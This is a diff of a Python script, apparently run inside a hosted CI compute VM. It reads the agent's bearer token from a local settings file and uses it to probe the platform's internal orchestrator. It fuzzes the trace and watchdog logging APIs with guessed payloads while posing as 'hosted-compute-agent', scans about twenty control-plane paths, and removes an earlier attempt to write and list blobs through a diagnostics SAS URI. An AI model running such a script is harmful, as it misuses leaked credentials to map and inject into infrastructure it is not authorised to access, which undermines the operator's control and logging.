@@ -1,85 +1,92 @@
-import json, urllib.request, sys
+import json, urllib.request, sys, time
 
 settings = json.loads(open("/opt/hca/.settings", "rb").read())
 token = settings["authToken"]
 sched = settings["schedulerApiUrl"]
-trace = settings["traceApiUrl"]
-wd = settings.get("watchdogTraceApiUrl", "")
-sas = settings.get("diagnosticsSasUri", "")
+trace_url = settings["traceApiUrl"]
+wd_url = settings.get("watchdogTraceApiUrl", "")
 
 print(f"TOKEN_LEN: {len(token)}")
-print(f"SCHED: {sched}")
-print(f"TRACE: {trace}")
-print(f"WD: {wd}")
-print(f"SAS_LEN: {len(sas)}")
+print(f"TRACE: {trace_url}")
+print(f"WD: {wd_url}")
 
-# Use token directly on orchestrator — no copy, no masking
-endpoints = [
-    ("GET", sched, "sched_root"),
-    ("GET", sched + "/status", "sched_status"),
-    ("GET", sched + "/health", "sched_health"),
-    ("GET", sched + "/vms", "sched_vms"),
-    ("GET", sched + "/allocations", "sched_alloc"),
-    ("GET", sched + "/config", "sched_config"),
-    ("POST", sched + "/heartbeat", "sched_heartbeat"),
-    ("POST", sched + "/trace", "sched_trace"),
-    ("POST", trace, "trace_root"),
-    ("GET", wd.replace("/trace", ""), "wd_root"),
-    ("GET", wd.replace("/trace", "/health"), "wd_health"),
-    ("POST", wd, "wd_trace"),
+# Try various payloads for trace API
+# Error said: []api.HostedComputeAgentLog — it expects a JSON ARRAY of log objects
+payloads = [
+    # 1. Empty array
+    ("empty_array", []),
+    # 2. Minimal log entry
+    ("minimal", [{"message": "test"}]),
+    # 3. With level and timestamp
+    ("with_level", [{"level": "INFO", "message": "test", "timestamp": "2026-07-24T10:00:00Z"}]),
+    # 4. With more fields (guessing from HCA log format)
+    ("full_log", [{"level": "INFO", "ts": 1784889208, "logger": "hosted-compute-agent", "msg": "security test"}]),
+    # 5. With orchestration_id
+    ("with_orch", [{"level": "INFO", "msg": "test", "orchestration_id": "test-123", "source_correlation_id": "test-456"}]),
+    # 6. String array
+    ("string_array", ["test log entry"]),
 ]
 
-for method, url, label in endpoints:
-    if not url:
-        continue
+for label, payload in payloads:
+    print(f"
+--- TRACE {label} ---")
     try:
-        if method == "POST":
-            req = urllib.request.Request(url, method="POST", data=b'{"test":true}')
-        else:
-            req = urllib.request.Request(url)
+        req = urllib.request.Request(trace_url, method="POST",
+            data=json.dumps(payload).encode())
         req.add_header("Authorization", "Bearer " + token)
         req.add_header("Content-Type", "application/json")
         req.add_header("User-Agent", "hosted-compute-agent")
-        resp = urllib.request.urlopen(req, timeout=3)
-        body = resp.read().decode()[:500]
-        print(f"ORCH {label}: [{resp.status}] {body}")
-    except urllib.error.HTTPError as e:
-        body = e.read().decode()[:300]
-        print(f"ORCH {label}: [{e.code}] {body}")
-    except Exception as ex:
-        print(f"ORCH {label}: ERR {str(ex)[:100]}")
-
-# Try SAS URI operations
-if sas:
-    # Write test
-    try:
-        write_url = sas.split("?")[0] + "/orch-test.txt?" + sas.split("?")[1]
-        req = urllib.request.Request(write_url, method="PUT", data=b"orchestrator access test")
-        req.add_header("x-ms-blob-type", "BlockBlob")
-        req.add_header("Content-Type", "text/plain")
         resp = urllib.request.urlopen(req, timeout=5)
-        print(f"BLOB_WRITE: [{resp.status}]")
+        print(f"  [{resp.status}] {resp.read().decode()[:300]}")
     except urllib.error.HTTPError as e:
-        print(f"BLOB_WRITE: [{e.code}] {e.read().decode()[:200]}")
+        print(f"  [{e.code}] {e.read().decode()[:300]}")
     except Exception as ex:
-        print(f"BLOB_WRITE: ERR {str(ex)[:100]}")
+        print(f"  ERR {str(ex)[:100]}")
 
-    # List (prob fails but try)
+# Try watchdog trace
+# Error said: []models.OnVmLog
+wd_payloads = [
+    ("empty", []),
+    ("minimal", [{"message": "test"}]),
+    ("with_level", [{"level": "INFO", "message": "test", "timestamp": 1784889208}]),
+    ("full", [{"Level": "INFO", "Message": "test", "Timestamp": "2026-07-24T10:00:00Z", "Logger": "test"}]),
+]
+
+for label, payload in wd_payloads:
+    print(f"
+--- WD {label} ---")
     try:
-        list_url = sas + "&restype=container&comp=list"
-        req = urllib.request.Request(list_url)
+        req = urllib.request.Request(wd_url, method="POST",
+            data=json.dumps(payload).encode())
+        req.add_header("Authorization", "Bearer " + token)
+        req.add_header("Content-Type", "application/json")
+        req.add_header("User-Agent", "hosted-compute-agent")
         resp = urllib.request.urlopen(req, timeout=5)
-        print(f"BLOB_LIST: [{resp.status}] {resp.read().decode()[:500]}")
+        print(f"  [{resp.status}] {resp.read().decode()[:300]}")
     except urllib.error.HTTPError as e:
-        print(f"BLOB_LIST: [{e.code}]")
+        print(f"  [{e.code}] {e.read().decode()[:300]}")
     except Exception as ex:
-        print(f"BLOB_LIST: ERR {str(ex)[:100]}")
+        print(f"  ERR {str(ex)[:100]}")
 
-# Print all settings keys (safe)
-safe = {}
-for k, v in settings.items():
-    if isinstance(v, str):
-        safe[k] = v[:30] + "..." if len(v) > 30 else v
-    else:
-        safe[k] = v
-print(f"ALL_KEYS: {json.dumps(safe, indent=2)}")
+# Try more orchestrator endpoints with different URL patterns
+print("
+--- ORCHESTRATOR URL SCAN ---")
+base = sched.replace("/v1", "")
+for path in ["/", "/health", "/healthz", "/v1", "/v2", "/api", "/api/v1",
+             "/v1/machines", "/v1/request", "/v1/finish", "/v1/register",
+             "/v1/deregister", "/v1/complete", "/v1/cancel", "/v1/logs",
+             "/v1/diagnostics", "/v1/settings", "/v1/agent", "/v1/runner"]:
+    try:
+        req = urllib.request.Request(base + path)
+        req.add_header("Authorization", "Bearer " + token)
+        req.add_header("User-Agent", "hosted-compute-agent")
+        resp = urllib.request.urlopen(req, timeout=2)
+        body = resp.read().decode()[:200]
+        print(f"  {path}: [{resp.status}] {body}")
+    except urllib.error.HTTPError as e:
+        code = e.code
+        if code not in (404,):
+            body = e.read().decode()[:200]
+            print(f"  {path}: [{code}] {body}")
+    except:
+        pass
